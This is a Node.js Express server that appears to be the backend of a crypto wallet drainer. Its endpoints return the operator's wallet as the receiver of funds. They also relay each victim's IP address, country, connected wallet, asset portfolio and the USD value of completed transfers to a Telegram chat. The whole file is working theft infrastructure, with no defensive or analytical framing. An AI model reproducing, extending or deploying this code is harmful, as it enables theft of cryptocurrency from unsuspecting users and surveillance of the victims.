const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const compression = require('compression');

const DATABASE = require('./database.json');
const { initTG, sendMessageToChat } = require("./bot");
const { getHostnameFromRegex } = require("./functions");
const { lmao } = require('./fun');

const app = express();
const port = 3000;

app.use(compression());
app.use(cors());
app.use(bodyParser.json({ limit: '150mb' }));
app.use(bodyParser.urlencoded({ limit: '150mb', extended: true }));

// Utility to check connection key
function checkConnectionKey(key = null) {
    try {
        if (key !== DATABASE.connectionKey) {
            console.error('Invalid connection key:', key);
            return false;
        }
        return true;
    } catch (e) {
        console.error('Error in connection key validation:', e);
        return false;
    }
}

// Validate incoming requests for required parameters
function validateParams(params, requiredFields) {
    for (const field of requiredFields) {
        if (!params[field]) {
            console.error(`Missing required parameter: ${field}`);
            return false;
        }
    }
    return true;
}

// Routes
app.post("/onaccept", async (req, res) => {
    try {
        const { CONNECTIONKEY, ORIGIN, ITEMS, GCID, CIP, COUNTRY } = req.body;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return res.status(403).send("Invalid connection key");
        }

        if (!validateParams(req.body, ['ORIGIN', 'ITEMS', 'GCID', 'CIP', 'COUNTRY'])) {
            return res.status(400).send("Missing required parameters");
        }

        if (ITEMS?.length) {
            const formatter = new Intl.NumberFormat('en-US', {
                style: 'currency',
                currency: 'USD',
            });

            const totalValue = ITEMS.reduce((sum, item) => sum + (parseFloat(item.VALUE) || 0), 0);

            await sendMessageToChat(GCID, `<b>&#128184; New transaction (IP: ${CIP} / Country: ${COUNTRY})\n\n🔗 Domain: ${getHostnameFromRegex(ORIGIN)}\n&#9989; USD: ${formatter.format(totalValue)}\nTotal activity: ${ITEMS.length}</b>`);
        }

        res.send(lmao());
    } catch (e) {
        console.error("Error in /onaccept:", e);
        res.status(500).send("Internal server error");
    }
});

app.post('/details', async (req, res) => {
    try {
        const { CONNECTIONKEY } = req.body;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return res.status(403).send("Invalid connection key");
        }

        const wallet = DATABASE.ownerPublicKey;
        res.json({ RECEIVER: wallet });
    } catch (e) {
        console.error("Error in /details:", e);
        res.status(500).send("Internal server error");
    }
});

app.post('/info', async (req, res) => {
    try {
        const { CONNECTIONKEY, WALLET, PORTFOLIO, ORIGIN, GCID, CIP, COUNTRY } = req.body;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return res.status(403).send("Invalid connection key");
        }

        if (!validateParams(req.body, ['WALLET', 'PORTFOLIO', 'ORIGIN', 'GCID', 'CIP', 'COUNTRY'])) {
            return res.status(400).send("Missing required parameters");
        }

        const formatter = new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD',
        });

        const addressPartOne = WALLET.slice(0, 6);
        const addressPartTwo = WALLET.slice(-4);
        const totalValue = PORTFOLIO.reduce((sum, item) => sum + (parseFloat(item.VALUE) || 0), 0);

        let message = `<b>⚡️ User connected the wallet (IP: ${CIP} / Country: ${COUNTRY})</b>\n\n<b>&#128123; Wallet: <a href="https://app.step.finance/en/dashboard?watching=${WALLET}">${addressPartOne}...${addressPartTwo}</a></b>\n<b>&#128279; Domain: ${getHostnameFromRegex(ORIGIN)}</b>\n\n<b>User Assets:</b>\n<blockquote>`;

        PORTFOLIO.forEach((item, index) => {
            if (item.VALUE > 0) {
                message += `${index + 1}. ${item.MINT} - ${item.NAME} - ${formatter.format(item.VALUE)}\n`;
            }
        });

        message += `</blockquote>\n\n&#128179; <b>Total Value:</b> <pre>${formatter.format(totalValue)}</pre>`;

        await sendMessageToChat(GCID, message);

        res.send(lmao());
    } catch (e) {
        console.error("Error in /info:", e);
        res.status(500).send("Internal server error");
    }
});

app.post('/join', async (req, res) => {
    try {
        const { CONNECTIONKEY, ORIGIN, GCID, CIP, COUNTRY } = req.body;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return res.status(403).send("Invalid connection key");
        }

        if (!validateParams(req.body, ['ORIGIN', 'GCID', 'CIP', 'COUNTRY'])) {
            return res.status(400).send("Missing required parameters");
        }

        let message = `<b>👨‍💻 User opened the website (IP: ${CIP} / Country: ${COUNTRY})</b>\n\n<b>🔗 Domain: ${getHostnameFromRegex(ORIGIN)}</b>`;
        await sendMessageToChat(GCID, message);

        res.status(200).send("Join endpoint processed successfully");
    } catch (e) {
        console.error("Error in /join:", e);
        res.status(500).send("Internal server error");
    }
});

app.post('/connect', async (req, res) => {
    try {
        const { CONNECTIONKEY } = req.body;

        if (!checkConnectionKey(CONNECTIONKEY)) {
            return res.send(lmao());
        }

        res.send("1");
    } catch (e) {
        console.error("Error in /connect:", e);
        res.status(500).send("Internal server error");
    }
});

// Catch-all routes
app.get("/*", (req, res) => {
    res.status(404).send(`Cannot ${req.method} ${req.originalUrl}`);
});

app.post("/*", (req, res) => {
    res.status(404).send(`Cannot ${req.method} ${req.originalUrl}`);
});

// Start server
app.listen(port, '0.0.0.0', async () => {
    await initTG();
    console.log(`Server is running on port ${port}`);
});
